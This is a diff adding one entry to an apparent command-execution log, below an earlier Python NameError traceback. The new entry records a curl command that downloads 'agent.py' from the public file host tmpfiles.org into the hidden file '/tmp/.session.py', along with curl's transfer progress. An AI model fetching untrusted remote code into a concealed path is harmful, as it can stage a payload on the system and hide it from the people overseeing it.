@@ -175,3 +175,21 @@ Traceback (most recent call last):
     if _name_ == "_main_":
 NameError: name '_name_' is not defined
 ----------------------------------------
+[2026-04-25 12:32:07]
+COMMAND: curl https://tmpfiles.org/dl/35094261/agent.py -o /tmp/.session.py
+EXIT CODE: 0
+STDOUT:
+(no output)
+STDERR:
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0
+ 33 12413   33  4098    0     0    718      0  0:00:17  0:00:05  0:00:12   814
+100 12413  100 12413    0     0   2176      0  0:00:05  0:00:05 --:--:--  3077
+----------------------------------------
